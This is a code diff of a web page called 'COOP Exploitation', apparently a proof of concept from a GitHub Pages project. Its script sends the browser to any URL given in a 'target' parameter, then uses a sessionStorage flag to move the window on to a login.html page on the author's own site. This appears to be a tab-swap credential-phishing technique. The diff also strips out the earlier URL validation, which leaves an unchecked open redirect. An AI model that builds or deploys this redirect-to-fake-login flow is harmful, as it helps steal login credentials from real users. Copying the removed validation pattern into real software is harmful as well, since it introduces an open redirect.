@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>COOP Exploitation Test</title>
+    <title>COOP Exploitation</title>
     <style>
         body {
             background-color: white;
@@ -54,41 +54,38 @@
         }
     </style>
     <script type="text/javascript">
-        function isValidUrl(url) {
-            // Basic URL validation
-            const pattern = /^(https?:\/\/)(([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})(\/[^\s]*)?$/;
-            return pattern.test(url);
-        }
-
         function getTargetParam() {
             const params = new URLSearchParams(window.location.search);
             return params.get("target") ? decodeURIComponent(params.get("target")) : null;
         }
 
-        function redirect() {
+        function redirectToTarget() {
             const target = getTargetParam();
-            if (!target || !isValidUrl(target)) {
-                console.error("Invalid or missing target URL. Aborting redirection.");
+            if (!target) {
+                console.error("No target parameter found. Aborting redirection.");
                 return;
             }
 
-            console.log(`Opening target site: ${target}`);
+            console.log(`Redirecting to: ${target}`);
             window.location.href = target;
 
-            // After 6 seconds, redirect to login.html
-            setTimeout(() => {
-                console.log("Redirecting to login.html...");
-                window.location.href = "https://sp3ttr0.github.io/COOP-Exploit/login.html";
-            }, 6000);
+            // Store the flag in sessionStorage to remember that we redirected
+            sessionStorage.setItem("redirected", "true");
+        }
+
+        function redirectToLogin() {
+            console.log("Redirecting to login.html...");
+            window.location.href = "https://sp3ttr0.github.io/COOP-Exploit/login.html";
         }
 
         function setup() {
-            setTimeout(() => {
-                console.log("Refreshing page...");
-                location.reload();
-            }, 5000); // Refresh after 5 seconds if nothing happens
-            
-            setTimeout(redirect, 3000); // Redirect to target after 3 seconds
+            if (sessionStorage.getItem("redirected")) {
+                // If the page was redirected before, now go to login.html
+                sessionStorage.removeItem("redirected"); // Clean up the flag
+                redirectToLogin();
+            } else {
+                setTimeout(redirectToTarget, 2000); // Redirect to target after 2 seconds
+            }
         }
 
         window.onload = setup;
